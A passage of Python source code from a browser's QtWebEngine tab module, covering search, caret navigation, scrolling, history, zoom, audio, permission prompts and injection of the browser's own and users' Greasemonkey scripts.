IDs.\n_JS_WORLD_MAP = {\n    usertypes.JsWorld.main: QWebEngineScript.MainWorld,\n    usertypes.JsWorld.application: QWebEngineScript.ApplicationWorld,\n    usertypes.JsWorld.user: QWebEngineScript.UserWorld,\n    usertypes.JsWorld.jseval: QWebEngineScript.UserWorld + 1,\n}\n\n\nclass WebEngineAction(browsertab.AbstractAction):\n\n    \"\"\"QtWebEngine implementations related to web actions.\"\"\"\n\n    action_class = QWebEnginePage\n    action_base = QWebEnginePage.WebAction\n\n    def exit_fullscreen(self):\n        self._widget.triggerPageAction(QWebEnginePage.ExitFullScreen)\n\n    def save_page(self):\n        \"\"\"Save the current page.\"\"\"\n        self._widget.triggerPageAction(QWebEnginePage.SavePage)\n\n    def show_source(self, pygments=False):\n        if pygments:\n            self._show_source_pygments()\n            return\n\n        try:\n            self._widget.triggerPageAction(QWebEnginePage.ViewSource)\n        except AttributeError:\n            # Qt < 5.8\n            tb = objreg.get('tabbed-browser', scope='window',\n                            window=self._tab.win_id)\n            urlstr = self._tab.url().toString(QUrl.RemoveUserInfo)\n            # The original URL becomes the path of a view-source: URL\n            # (without a host), but query/fragment should stay.\n            url = QUrl('view-source:' + urlstr)\n            tb.tabopen(url, background=False, related=True)\n\n\nclass WebEnginePrinting(browsertab.AbstractPrinting):\n\n    \"\"\"QtWebEngine implementations related to printing.\"\"\"\n\n    def check_pdf_support(self):\n        pass\n\n    def check_printer_support(self):\n        if not hasattr(self._widget.page(), 'print'):\n            raise browsertab.WebTabError(\n                \"Printing is unsupported with QtWebEngine on Qt < 5.8\")\n\n    def check_preview_support(self):\n        raise browsertab.WebTabError(\n            \"Print previews are unsupported with QtWebEngine\")\n\n    def to_pdf(self, filename):\n        self._widget.page().printToPdf(filename)\n\n    def to_printer(self, printer, callback=None):\n        if callback is None:\n            callback = lambda _ok: None\n        self._widget.page().print(printer, callback)\n\n\nclass WebEngineSearch(browsertab.AbstractSearch):\n\n    \"\"\"QtWebEngine implementations related to searching on the page.\n\n    Attributes:\n        _flags: The QWebEnginePage.FindFlags of the last search.\n        _pending_searches: How many searches have been started but not called\n                           back yet.\n    \"\"\"\n\n    def __init__(self, tab, parent=None):\n        super().__init__(tab, parent)\n        self._flags = QWebEnginePage.FindFlags(0)\n        self._pending_searches = 0\n\n    def _find(self, text, flags, callback, caller):\n        \"\"\"Call findText on the widget.\"\"\"\n        self.search_displayed = True\n        self._pending_searches += 1\n\n        def wrapped_callback(found):\n            \"\"\"Wrap the callback to do debug logging.\"\"\"\n            self._pending_searches -= 1\n            if self._pending_searches > 0:\n                # See https://github.com/qutebrowser/qutebrowser/issues/2442\n                # and https://github.com/qt/qtwebengine/blob/5.10/src/core/web_contents_adapter.cpp#L924-L934\n                log.webview.debug(\"Ignoring cancelled search callback with \"\n                                  \"{} pending searches\".format(\n                                      self._pending_searches))\n                return\n\n            if sip.isdeleted(self._widget):\n                # This happens when starting a search, and closing the tab\n                # before results arrive.\n                log.webview.debug(\"Ignoring finished search for deleted \"\n                                  \"widget\")\n                return\n\n            found_text = 'found' if found else \"didn't find\"\n            if flags:\n                flag_text = 'with flags {}'.format(debug.qflags_key(\n                    QWebEnginePage, flags, klass=QWebEnginePage.FindFlag))\n            else:\n                flag_text = ''\n            log.webview.debug(' '.join([caller, found_text, text, flag_text])\n                              .strip())\n\n            if callback is not None:\n                callback(found)\n            self.finished.emit(found)\n\n        self._widget.findText(text, flags, wrapped_callback)\n\n    def search(self, text, *, ignore_case=usertypes.IgnoreCase.never,\n               reverse=False, result_cb=None):\n        # Don't go to next entry on duplicate search\n        if self.text == text and self.search_displayed:\n            log.webview.debug(\"Ignoring duplicate search request\"\n                              \" for {}\".format(text))\n            return\n\n        self.text = text\n        self._flags = QWebEnginePage.FindFlags(0)\n        if self._is_case_sensitive(ignore_case):\n            self._flags |= QWebEnginePage.FindCaseSensitively\n        if reverse:\n            self._flags |= QWebEnginePage.FindBackward\n\n        self._find(text, self._flags, result_cb, 'search')\n\n    def clear(self):\n        if self.search_displayed:\n            self.cleared.emit()\n        self.search_displayed = False\n        self._widget.findText('')\n\n    def prev_result(self, *, result_cb=None):\n        # The int() here makes sure we get a copy of the flags.\n        flags = QWebEnginePage.FindFlags(int(self._flags))\n        if flags & QWebEnginePage.FindBackward:\n            flags &= ~QWebEnginePage.FindBackward\n        else:\n            flags |= QWebEnginePage.FindBackward\n        self._find(self.text, flags, result_cb, 'prev_result')\n\n    def next_result(self, *, result_cb=None):\n        self._find(self.text, self._flags, result_cb, 'next_result')\n\n\nclass WebEngineCaret(browsertab.AbstractCaret):\n\n    \"\"\"QtWebEngine implementations related to moving the cursor/selection.\"\"\"\n\n    def _flags(self):\n        \"\"\"Get flags to pass to JS.\"\"\"\n        flags = set()\n        if qtutils.version_check('5.7.1', compiled=False):\n            flags.add('filter-prefix')\n        if utils.is_windows:\n            flags.add('windows')\n        return list(flags)\n\n    @pyqtSlot(usertypes.KeyMode)\n    def _on_mode_entered(self, mode):\n        if mode != usertypes.KeyMode.caret:\n            return\n\n        if self._tab.search.search_displayed:\n            # We are currently in search mode.\n            # convert the search to a blue selection so we can operate on it\n            # https://bugreports.qt.io/browse/QTBUG-60673\n            self._tab.search.clear()\n\n        self._tab.run_js_async(\n            javascript.assemble('caret', 'setFlags', self._flags()))\n\n        self._js_call('setInitialCursor', callback=self._selection_cb)\n\n    def _selection_cb(self, enabled):\n        \"\"\"Emit selection_toggled based on setInitialCursor.\"\"\"\n        if self._mode_manager.mode != usertypes.KeyMode.caret:\n            log.webview.debug(\"Ignoring selection cb due to mode change.\")\n            return\n        if enabled is None:\n            log.webview.debug(\"Ignoring selection status None\")\n            return\n        self.selection_toggled.emit(enabled)\n\n    @pyqtSlot(usertypes.KeyMode)\n    def _on_mode_left(self, mode):\n        if mode != usertypes.KeyMode.caret:\n            return\n\n        self.drop_selection()\n        self._js_call('disableCaret')\n\n    def move_to_next_line(self, count=1):\n        self._js_call('moveDown', count)\n\n    def move_to_prev_line(self, count=1):\n        self._js_call('moveUp', count)\n\n    def move_to_next_char(self, count=1):\n        self._js_call('moveRight', count)\n\n    def move_to_prev_char(self, count=1):\n        self._js_call('moveLeft', count)\n\n    def move_to_end_of_word(self, count=1):\n        self._js_call('moveToEndOfWord', count)\n\n    def move_to_next_word(self, count=1):\n        self._js_call('moveToNextWord', count)\n\n    def move_to_prev_word(self, count=1):\n        self._js_call('moveToPreviousWord', count)\n\n    def move_to_start_of_line(self):\n        self._js_call('moveToStartOfLine')\n\n    def move_to_end_of_line(self):\n        self._js_call('moveToEndOfLine')\n\n    def move_to_start_of_next_block(self, count=1):\n        self._js_call('moveToStartOfNextBlock', count)\n\n    def move_to_start_of_prev_block(self, count=1):\n        self._js_call('moveToStartOfPrevBlock', count)\n\n    def move_to_end_of_next_block(self, count=1):\n        self._js_call('moveToEndOfNextBlock', count)\n\n    def move_to_end_of_prev_block(self, count=1):\n        self._js_call('moveToEndOfPrevBlock', count)\n\n    def move_to_start_of_document(self):\n        self._js_call('moveToStartOfDocument')\n\n    def move_to_end_of_document(self):\n        self._js_call('moveToEndOfDocument')\n\n    def toggle_selection(self):\n        self._js_call('toggleSelection', callback=self.selection_toggled.emit)\n\n    def drop_selection(self):\n        self._js_call('dropSelection')\n\n    def selection(self, callback):\n        # Not using selectedText() as WORKAROUND for\n        # https://bugreports.qt.io/browse/QTBUG-53134\n        # Even on Qt 5.10 selectedText() seems to work poorly, see\n        # https://github.com/qutebrowser/qutebrowser/issues/3523\n        self._tab.run_js_async(javascript.assemble('caret', 'getSelection'),\n                               callback)\n\n    def reverse_selection(self):\n        self._js_call('reverseSelection')\n\n    def _follow_selected_cb_wrapped(self, js_elem, tab):\n        try:\n            self._follow_selected_cb(js_elem, tab)\n        finally:\n            self.follow_selected_done.emit()\n\n    def _follow_selected_cb(self, js_elem, tab):\n        \"\"\"Callback for javascript which clicks the selected element.\n\n        Args:\n            js_elem: The element serialized from javascript.\n            tab: Open in a new tab.\n        \"\"\"\n        if js_elem is None:\n            return\n\n        if js_elem == \"focused\":\n            # we had a focused element, not a selected one. Just send <enter>\n            self._follow_enter(tab)\n            return\n\n        assert isinstance(js_elem, dict), js_elem\n        elem = webengineelem.WebEngineElement(js_elem, tab=self._tab)\n        if tab:\n            click_type = usertypes.ClickTarget.tab\n        else:\n            click_type = usertypes.ClickTarget.normal\n\n        # Only click if we see a link\n        if elem.is_link():\n            log.webview.debug(\"Found link in selection, clicking. ClickTarget \"\n                              \"{}, elem {}\".format(click_type, elem))\n            try:\n                elem.click(click_type)\n            except webelem.Error as e:\n                message.error(str(e))\n\n    def follow_selected(self, *, tab=False):\n        if self._tab.search.search_displayed:\n            # We are currently in search mode.\n            # let's click the link via a fake-click\n            # https://bugreports.qt.io/browse/QTBUG-60673\n            self._tab.search.clear()\n\n            log.webview.debug(\"Clicking a searched link via fake key press.\")\n            # send a fake enter, clicking the orange selection box\n            self._follow_enter(tab)\n        else:\n            # click an existing blue selection\n            js_code = javascript.assemble('webelem',\n                                          'find_selected_focused_link')\n            self._tab.run_js_async(\n                js_code,\n                lambda jsret: self._follow_selected_cb_wrapped(jsret, tab))\n\n    def _js_call(self, command, *args, callback=None):\n        code = javascript.assemble('caret', command, *args)\n        self._tab.run_js_async(code, callback)\n\n\nclass WebEngineScroller(browsertab.AbstractScroller):\n\n    \"\"\"QtWebEngine implementations related to scrolling.\"\"\"\n\n    def __init__(self, tab, parent=None):\n        super().__init__(tab, parent)\n        self._pos_perc = (0, 0)\n        self._pos_px = QPoint()\n        self._at_bottom = False\n\n    def _init_widget(self, widget):\n        super()._init_widget(widget)\n        page = widget.page()\n        page.scrollPositionChanged.connect(self._update_pos)\n\n    def _repeated_key_press(self, key, count=1, modifier=Qt.NoModifier):\n        \"\"\"Send count fake key presses to this scroller's WebEngineTab.\"\"\"\n        for _ in range(min(count, 1000)):\n            self._tab.fake_key_press(key, modifier)\n\n    @pyqtSlot(QPointF)\n    def _update_pos(self, pos):\n        \"\"\"Update the scroll position attributes when it changed.\"\"\"\n        self._pos_px = pos.toPoint()\n        contents_size = self._widget.page().contentsSize()\n\n        scrollable_x = contents_size.width() - self._widget.width()\n        if scrollable_x == 0:\n            perc_x = 0\n        else:\n            try:\n                perc_x = min(100, round(100 / scrollable_x * pos.x()))\n            except ValueError:\n                # https://github.com/qutebrowser/qutebrowser/issues/3219\n                log.misc.debug(\"Got ValueError for perc_x!\")\n                log.misc.debug(\"contents_size.width(): {}\".format(\n                    contents_size.width()))\n                log.misc.debug(\"self._widget.width(): {}\".format(\n                    self._widget.width()))\n                log.misc.debug(\"scrollable_x: {}\".format(scrollable_x))\n                log.misc.debug(\"pos.x(): {}\".format(pos.x()))\n                raise\n\n        scrollable_y = contents_size.height() - self._widget.height()\n        if scrollable_y == 0:\n            perc_y = 0\n        else:\n            try:\n                perc_y = min(100, round(100 / scrollable_y * pos.y()))\n            except ValueError:\n                # https://github.com/qutebrowser/qutebrowser/issues/3219\n                log.misc.debug(\"Got ValueError for perc_y!\")\n                log.misc.debug(\"contents_size.height(): {}\".format(\n                    contents_size.height()))\n                log.misc.debug(\"self._widget.height(): {}\".format(\n                    self._widget.height()))\n                log.misc.debug(\"scrollable_y: {}\".format(scrollable_y))\n                log.misc.debug(\"pos.y(): {}\".format(pos.y()))\n                raise\n\n        self._at_bottom = math.ceil(pos.y()) >= scrollable_y\n\n        if (self._pos_perc != (perc_x, perc_y) or\n                'no-scroll-filtering' in objects.debug_flags):\n            self._pos_perc = perc_x, perc_y\n            self.perc_changed.emit(*self._pos_perc)\n\n    def pos_px(self):\n        return self._pos_px\n\n    def pos_perc(self):\n        return self._pos_perc\n\n    def to_perc(self, x=None, y=None):\n        js_code = javascript.assemble('scroll', 'to_perc', x, y)\n        self._tab.run_js_async(js_code)\n\n    def to_point(self, point):\n        js_code = javascript.assemble('window', 'scroll', point.x(), point.y())\n        self._tab.run_js_async(js_code)\n\n    def to_anchor(self, name):\n        url = self._tab.url()\n        url.setFragment(name)\n        self._tab.load_url(url)\n\n    def delta(self, x=0, y=0):\n        self._tab.run_js_async(javascript.assemble('window', 'scrollBy', x, y))\n\n    def delta_page(self, x=0, y=0):\n        js_code = javascript.assemble('scroll', 'delta_page', x, y)\n        self._tab.run_js_async(js_code)\n\n    def up(self, count=1):\n        self._repeated_key_press(Qt.Key_Up, count)\n\n    def down(self, count=1):\n        self._repeated_key_press(Qt.Key_Down, count)\n\n    def left(self, count=1):\n        self._repeated_key_press(Qt.Key_Left, count)\n\n    def right(self, count=1):\n        self._repeated_key_press(Qt.Key_Right, count)\n\n    def top(self):\n        self._tab.fake_key_press(Qt.Key_Home)\n\n    def bottom(self):\n        self._tab.fake_key_press(Qt.Key_End)\n\n    def page_up(self, count=1):\n        self._repeated_key_press(Qt.Key_PageUp, count)\n\n    def page_down(self, count=1):\n        self._repeated_key_press(Qt.Key_PageDown, count)\n\n    def at_top(self):\n        return self.pos_px().y() == 0\n\n    def at_bottom(self):\n        return self._at_bottom\n\n\nclass WebEngineHistoryPrivate(browsertab.AbstractHistoryPrivate):\n\n    \"\"\"History-related methods which are not part of the extension API.\"\"\"\n\n    def serialize(self):\n        if not qtutils.version_check('5.9', compiled=False):\n            # WORKAROUND for\n            # https://github.com/qutebrowser/qutebrowser/issues/2289\n            # Don't use the history's currentItem here, because of\n            # https://bugreports.qt.io/browse/QTBUG-59599 and because it doesn't\n            # contain view-source.\n            scheme = self._tab.url().scheme()\n            if scheme in ['view-source', 'chrome']:\n                raise browsertab.WebTabError(\"Can't serialize special URL!\")\n        return qtutils.serialize(self._history)\n\n    def deserialize(self, data):\n        qtutils.deserialize(data, self._history)\n\n    def load_items(self, items):\n        if items:\n            self._tab.before_load_started.emit(items[-1].url)\n\n        stream, _data, cur_data = tabhistory.serialize(items)\n        qtutils.deserialize_stream(stream, self._history)\n\n        @pyqtSlot()\n        def _on_load_finished():\n            self._tab.scroller.to_point(cur_data['scroll-pos'])\n            self._tab.load_finished.disconnect(_on_load_finished)\n\n        if cur_data is not None:\n            if 'zoom' in cur_data:\n                self._tab.zoom.set_factor(cur_data['zoom'])\n            if ('scroll-pos' in cur_data and\n                    self._tab.scroller.pos_px() == QPoint(0, 0)):\n                self._tab.load_finished.connect(_on_load_finished)\n\n\nclass WebEngineHistory(browsertab.AbstractHistory):\n\n    \"\"\"QtWebEngine implementations related to page history.\"\"\"\n\n    def __init__(self, tab):\n        super().__init__(tab)\n        self.private_api = WebEngineHistoryPrivate(tab)\n\n    def __len__(self):\n        return len(self._history)\n\n    def __iter__(self):\n        return iter(self._history.items())\n\n    def current_idx(self):\n        return self._history.currentItemIndex()\n\n    def can_go_back(self):\n        return self._history.canGoBack()\n\n    def can_go_forward(self):\n        return self._history.canGoForward()\n\n    def _item_at(self, i):\n        return self._history.itemAt(i)\n\n    def _go_to_item(self, item):\n        self._tab.before_load_started.emit(item.url())\n        self._history.goToItem(item)\n\n\nclass WebEngineZoom(browsertab.AbstractZoom):\n\n    \"\"\"QtWebEngine implementations related to zooming.\"\"\"\n\n    def _set_factor_internal(self, factor):\n        self._widget.setZoomFactor(factor)\n\n\nclass WebEngineElements(browsertab.AbstractElements):\n\n    \"\"\"QtWebEngine implemementations related to elements on the page.\"\"\"\n\n    def _js_cb_multiple(self, callback, error_cb, js_elems):\n        \"\"\"Handle found elements coming from JS and call the real callback.\n\n        Args:\n            callback: The callback to call with the found elements.\n            error_cb: The callback to call in case of an error.\n            js_elems: The elements serialized from javascript.\n        \"\"\"\n        if js_elems is None:\n            error_cb(webelem.Error(\"Unknown error while getting \"\n                                   \"elements\"))\n            return\n        elif not js_elems['success']:\n            error_cb(webelem.Error(js_elems['error']))\n            return\n\n        elems = []\n        for js_elem in js_elems['result']:\n            elem = webengineelem.WebEngineElement(js_elem, tab=self._tab)\n            elems.append(elem)\n        callback(elems)\n\n    def _js_cb_single(self, callback, js_elem):\n        \"\"\"Handle a found focus elem coming from JS and call the real callback.\n\n        Args:\n            callback: The callback to call with the found element.\n                      Called with a WebEngineElement or None.\n            js_elem: The element serialized from javascript.\n        \"\"\"\n        debug_str = ('None' if js_elem is None\n                     else utils.elide(repr(js_elem), 1000))\n        log.webview.debug(\"Got element from JS: {}\".format(debug_str))\n\n        if js_elem is None:\n            callback(None)\n        else:\n            elem = webengineelem.WebEngineElement(js_elem, tab=self._tab)\n            callback(elem)\n\n    def find_css(self, selector, callback, error_cb, *,\n                 only_visible=False):\n        js_code = javascript.assemble('webelem', 'find_css', selector,\n                                      only_visible)\n        js_cb = functools.partial(self._js_cb_multiple, callback, error_cb)\n        self._tab.run_js_async(js_code, js_cb)\n\n    def find_id(self, elem_id, callback):\n        js_code = javascript.assemble('webelem', 'find_id', elem_id)\n        js_cb = functools.partial(self._js_cb_single, callback)\n        self._tab.run_js_async(js_code, js_cb)\n\n    def find_focused(self, callback):\n        js_code = javascript.assemble('webelem', 'find_focused')\n        js_cb = functools.partial(self._js_cb_single, callback)\n        self._tab.run_js_async(js_code, js_cb)\n\n    def find_at_pos(self, pos, callback):\n        assert pos.x() >= 0, pos\n        assert pos.y() >= 0, pos\n        pos /= self._tab.zoom.factor()\n        js_code = javascript.assemble('webelem', 'find_at_pos',\n                                      pos.x(), pos.y())\n        js_cb = functools.partial(self._js_cb_single, callback)\n        self._tab.run_js_async(js_code, js_cb)\n\n\nclass WebEngineAudio(browsertab.AbstractAudio):\n\n    \"\"\"QtWebEngine implemementations related to audio/muting.\n\n    Attributes:\n        _overridden: Whether the user toggled muting manually.\n                     If that's the case, we leave it alone.\n    \"\"\"\n\n    def __init__(self, tab, parent=None):\n        super().__init__(tab, parent)\n        self._overridden = False\n\n    def _connect_signals(self):\n        page = self._widget.page()\n        page.audioMutedChanged.connect(self.muted_changed)\n        page.recentlyAudibleChanged.connect(self.recently_audible_changed)\n        self._tab.url_changed.connect(self._on_url_changed)\n        config.instance.changed.connect(self._on_config_changed)\n\n    def set_muted(self, muted: bool, override: bool = False) -> None:\n        self._overridden = override\n        assert self._widget is not None\n        page = self._widget.page()\n        page.setAudioMuted(muted)\n\n    def is_muted(self):\n        page = self._widget.page()\n        return page.isAudioMuted()\n\n    def is_recently_audible(self):\n        page = self._widget.page()\n        return page.recentlyAudible()\n\n    @pyqtSlot(QUrl)\n    def _on_url_changed(self, url):\n        if self._overridden:\n            return\n        mute = config.instance.get('content.mute', url=url)\n        self.set_muted(mute)\n\n    @config.change_filter('content.mute')\n    def _on_config_changed(self):\n        self._on_url_changed(self._tab.url())\n\n\nclass _WebEnginePermissions(QObject):\n\n    \"\"\"Handling of various permission-related signals.\"\"\"\n\n    # Using 0 as WORKAROUND for:\n    # https://www.riverbankcomputing.com/pipermail/pyqt/2019-July/041903.html\n\n    _options = {\n        0: 'content.notifications',\n        QWebEnginePage.Geolocation: 'content.geolocation',\n        QWebEnginePage.MediaAudioCapture: 'content.media_capture',\n        QWebEnginePage.MediaVideoCapture: 'content.media_capture',\n        QWebEnginePage.MediaAudioVideoCapture: 'content.media_capture',\n    }\n\n    _messages = {\n        0: 'show notifications',\n        QWebEnginePage.Geolocation: 'access your location',\n        QWebEnginePage.MediaAudioCapture: 'record audio',\n        QWebEnginePage.MediaVideoCapture: 'record video',\n        QWebEnginePage.MediaAudioVideoCapture: 'record audio/video',\n    }\n\n    def __init__(self, tab, parent=None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = None\n\n        try:\n            self._options.update({\n                QWebEnginePage.MouseLock:\n                    'content.mouse_lock',\n            })\n            self._messages.update({\n                QWebEnginePage.MouseLock:\n                    'hide your mouse pointer',\n            })\n        except AttributeError:\n            # Added in Qt 5.8\n            pass\n        try:\n            self._options.update({\n                QWebEnginePage.DesktopVideoCapture:\n                    'content.desktop_capture',\n                QWebEnginePage.DesktopAudioVideoCapture:\n                    'content.desktop_capture',\n            })\n            self._messages.update({\n                QWebEnginePage.DesktopVideoCapture:\n                    'capture your desktop',\n                QWebEnginePage.DesktopAudioVideoCapture:\n                    'capture your desktop and audio',\n            })\n        except AttributeError:\n            # Added in Qt 5.10\n            pass\n\n        assert self._options.keys() == self._messages.keys()\n\n    def connect_signals(self):\n        \"\"\"Connect related signals from the QWebEnginePage.\"\"\"\n        page = self._widget.page()\n        page.fullScreenRequested.connect(\n            self._on_fullscreen_requested)\n        page.featurePermissionRequested.connect(\n            self._on_feature_permission_requested)\n\n        if qtutils.version_check('5.11'):\n            page.quotaRequested.connect(\n                self._on_quota_requested)\n            page.registerProtocolHandlerRequested.connect(\n                self._on_register_protocol_handler_requested)\n\n    @pyqtSlot('QWebEngineFullScreenRequest')\n    def _on_fullscreen_requested(self, request):\n        request.accept()\n        on = request.toggleOn()\n\n        self._tab.data.fullscreen = on\n        self._tab.fullscreen_requested.emit(on)\n        if on:\n            notification = miscwidgets.FullscreenNotification(self._widget)\n            notification.show()\n            notification.set_timeout(3000)\n\n    @pyqtSlot(QUrl, 'QWebEnginePage::Feature')\n    def _on_feature_permission_requested(self, url, feature):\n        \"\"\"Ask the user for approval for geolocation/media/etc..\"\"\"\n        page = self._widget.page()\n        grant_permission = functools.partial(\n            page.setFeaturePermission, url, feature,\n            QWebEnginePage.PermissionGrantedByUser)\n        deny_permission = functools.partial(\n            page.setFeaturePermission, url, feature,\n            QWebEnginePage.PermissionDeniedByUser)\n\n        if feature not in self._options:\n            log.webview.error(\"Unhandled feature permission {}\".format(\n                debug.qenum_key(QWebEnginePage, feature)))\n            deny_permission()\n            return\n\n        if (\n                hasattr(QWebEnginePage, 'DesktopVideoCapture') and\n                feature in [QWebEnginePage.DesktopVideoCapture,\n                            QWebEnginePage.DesktopAudioVideoCapture] and\n                qtutils.version_check('5.13', compiled=False) and\n                not qtutils.version_check('5.13.2', compiled=False)\n        ):\n            # WORKAROUND for https://bugreports.qt.io/browse/QTBUG-78016\n            log.webview.warning(\"Ignoring desktop sharing request due to \"\n                                \"crashes in Qt < 5.13.2\")\n            deny_permission()\n            return\n\n        question = shared.feature_permission(\n            url=url.adjusted(QUrl.RemovePath),\n            option=self._options[feature], msg=self._messages[feature],\n            yes_action=grant_permission, no_action=deny_permission,\n            abort_on=[self._tab.abort_questions])\n\n        if question is not None:\n            page.featurePermissionRequestCanceled.connect(\n                functools.partial(self._on_feature_permission_cancelled,\n                                  question, url, feature))\n\n    def _on_feature_permission_cancelled(self, question, url, feature,\n                                         cancelled_url, cancelled_feature):\n        \"\"\"Slot invoked when a feature permission request was cancelled.\n\n        To be used with functools.partial.\n        \"\"\"\n        if url == cancelled_url and feature == cancelled_feature:\n            try:\n                question.abort()\n            except RuntimeError:\n                # The question could already be deleted, e.g. because it was\n                # aborted after a loadStarted signal.\n                pass\n\n    def _on_quota_requested(self, request):\n        size = utils.format_size(request.requestedSize())\n        shared.feature_permission(\n            url=request.origin().adjusted(QUrl.RemovePath),\n            option='content.persistent_storage',\n            msg='use {} of persistent storage'.format(size),\n            yes_action=request.accept, no_action=request.reject,\n            abort_on=[self._tab.abort_questions],\n            blocking=True)\n\n    def _on_register_protocol_handler_requested(self, request):\n        shared.feature_permission(\n            url=request.origin().adjusted(QUrl.RemovePath),\n            option='content.register_protocol_handler',\n            msg='open all {} links'.format(request.scheme()),\n            yes_action=request.accept, no_action=request.reject,\n            abort_on=[self._tab.abort_questions],\n            blocking=True)\n\n\nclass _WebEngineScripts(QObject):\n\n    def __init__(self, tab, parent=None):\n        super().__init__(parent)\n        self._tab = tab\n        self._widget = None\n        self._greasemonkey = objreg.get('greasemonkey')\n\n    def connect_signals(self):\n        \"\"\"Connect signals to our private slots.\"\"\"\n        config.instance.changed.connect(self._on_config_changed)\n\n        self._tab.search.cleared.connect(functools.partial(\n            self._update_stylesheet, searching=False))\n        self._tab.search.finished.connect(self._update_stylesheet)\n\n    @pyqtSlot(str)\n    def _on_config_changed(self, option):\n        if option in ['scrolling.bar', 'content.user_stylesheets']:\n            self._init_stylesheet()\n            self._update_stylesheet()\n\n    @pyqtSlot(bool)\n    def _update_stylesheet(self, searching=False):\n        \"\"\"Update the custom stylesheet in existing tabs.\"\"\"\n        css = shared.get_user_stylesheet(searching=searching)\n        code = javascript.assemble('stylesheet', 'set_css', css)\n        self._tab.run_js_async(code)\n\n    def _inject_early_js(self, name, js_code, *,\n                         world=QWebEngineScript.ApplicationWorld,\n                         subframes=False):\n        \"\"\"Inject the given script to run early on a page load.\n\n        This runs the script both on DocumentCreation and DocumentReady as on\n        some internal pages, DocumentCreation will not work.\n\n        That is a WORKAROUND for https://bugreports.qt.io/browse/QTBUG-66011\n        \"\"\"\n        scripts = self._widget.page().scripts()\n        for injection in ['creation', 'ready']:\n            injection_points = {\n                'creation': QWebEngineScript.DocumentCreation,\n                'ready': QWebEngineScript.DocumentReady,\n            }\n            script = QWebEngineScript()\n            script.setInjectionPoint(injection_points[injection])\n            script.setSourceCode(js_code)\n            script.setWorldId(world)\n            script.setRunsOnSubFrames(subframes)\n            script.setName('_qute_{}_{}'.format(name, injection))\n            scripts.insert(script)\n\n    def _remove_early_js(self, name):\n        \"\"\"Remove an early QWebEngineScript.\"\"\"\n        scripts = self._widget.page().scripts()\n        for injection in ['creation', 'ready']:\n            full_name = '_qute_{}_{}'.format(name, injection)\n            script = scripts.findScript(full_name)\n            if not script.isNull():\n                scripts.remove(script)\n\n    def init(self):\n        \"\"\"Initialize global qutebrowser JavaScript.\"\"\"\n        js_code = javascript.wrap_global(\n            'scripts',\n            utils.read_file('javascript/scroll.js'),\n            utils.read_file('javascript/webelem.js'),\n            utils.read_file('javascript/caret.js'),\n        )\n        if not qtutils.version_check('5.12'):\n            # WORKAROUND for Qt versions < 5.12 not exposing window.print().\n            # Qt 5.12 has a printRequested() signal so we don't need this hack\n            # anymore.\n            self._inject_early_js('js',\n                                  utils.read_file('javascript/print.js'),\n                                  subframes=True,\n                                  world=QWebEngineScript.MainWorld)\n        # FIXME:qtwebengine what about subframes=True?\n        self._inject_early_js('js', js_code, subframes=True)\n        self._init_stylesheet()\n\n        # The Greasemonkey metadata block support in QtWebEngine only starts at\n        # Qt 5.8. With 5.7.1, we need to inject the scripts ourselves in\n        # response to urlChanged.\n        if not qtutils.version_check('5.8'):\n            self._tab.url_changed.connect(\n                self._inject_greasemonkey_scripts_for_url)\n        else:\n            self._greasemonkey.scripts_reloaded.connect(\n                self._inject_all_greasemonkey_scripts)\n            self._inject_all_greasemonkey_scripts()\n\n    def _init_stylesheet(self):\n        \"\"\"Initialize custom stylesheets.\n\n        Partially inspired by QupZilla:\n        https://github.com/QupZilla/qupzilla/blob/v2.0/src/lib/app/mainapplication.cpp#L1063-L1101\n        \"\"\"\n        self._remove_early_js('stylesheet')\n        css = shared.get_user_stylesheet()\n        js_code = javascript.wrap_global(\n            'stylesheet',\n            utils.read_file('javascript/stylesheet.js'),\n            javascript.assemble('stylesheet', 'set_css', css),\n        )\n        self._inject_early_js('stylesheet', js_code, subframes=True)\n\n    @pyqtSlot(QUrl)\n    def _inject_greasemonkey_scripts_for_url(self, url):\n        matching_scripts = self._greasemonkey.scripts_for(url)\n        self._inject_greasemonkey_scripts(\n            matching_scripts.start, QWebEngineScript.DocumentCreation, True)\n        self._inject_greasemonkey_scripts(\n            matching_scripts.end, QWebEngineScript.DocumentReady, False)\n        self._inject_greasemonkey_scripts(\n            matching_scripts.idle, QWebEngineScript.Deferred, False)\n\n    @pyqtSlot()\n    def _inject_all_greasemonkey_scripts(self):\n        scripts = self._greasemonkey.all_scripts()\n        self._inject_greasemonkey_scripts(scripts)\n\n    def _remove_all_greasemonkey_scripts(self):\n        page_scripts = self._widget.page().scripts()\n        for script in page_scripts.toList():\n            if script.name().startswith(\"GM-\"):\n                log.greasemonkey.debug('Removing script: {}'\n                                       .format(script.name()))\n                removed = page_scripts.remove(script)\n                assert removed, script.name()\n\n    def _inject_greasemonkey_scripts(self, scripts=None, injection_point=None,\n                                     remove_first=True):\n        \"\"\"Register user JavaScript files with the current tab.\n\n        Args:\n            scripts: A list of GreasemonkeyScripts, or None to add all\n                     known by the Greasemonkey subsystem.\n            injection_point: The QWebEngineScript::InjectionPoint stage\n                             to inject the script into, None to use\n                             auto-detection.\n            remove_first: Whether to remove all previously injected\n                          scripts before adding these ones.\n        \"\"\"\n        if sip.isdeleted(self._widget):\n            return\n\n        # Since we are inserting scripts into a per-tab collection,\n        # rather than just injecting scripts on page load, we need to\n        # make sure we replace existing scripts, not just add new ones.\n        # While, taking care not to remove any other scripts that might\n        # have been added elsewhere, like the one for stylesheets.\n        page_scripts = self._widget.page().scripts()\n        if remove_first:\n            self._remove_all_greasemonkey_scripts()\n\n        if not scripts:\n            return\n\n        for script in scripts:\n            new_script = QWebEngineScript()\n            try:\n                world = int(script.jsworld)\n                if not 0 <= world <= qtutils.MAX_WORLD_ID:\n                    log.greasemonkey.error(\n                        \"script {} has invalid value for '@qute-js-world'\"\n                        \": {}, should be between 0 and {}\"\n                        .format(\n                            script.name,\n                            script.jsworld,\n                            qtutils.MAX_WORLD_ID))\n                    continue\n            except ValueError:\n                try:\n                    world = _JS_WORLD_MAP[usertypes.JsWorld[\n                        script.jsworld.lower()]]\n                except KeyError:\n                    log.greasemonkey.error(\n                        \"script {} has invalid value for '@qute-js-world'\"\n                        \": {}\".format(script.name, script.jsworld))\n                    continue\n            new_script.setWorldId(world)\n            new_script.setSourceCode(script.code())\n            new_script.setName(\"GM-{}\".format(script.name))\n            new_script.setRunsOnSubFrames(script.runs_on_sub_frames)\n\n            # Override the @run-at value parsed by QWebEngineScript if desired.\n            if injection_point:\n                new_script.setInjectionPoint(injection_point)\n            elif script.needs_document_end_workaround():\n                log.greasemonkey.debug(\"Forcing @run-at document-end for {}\"\n                                       .format(script.name))\n                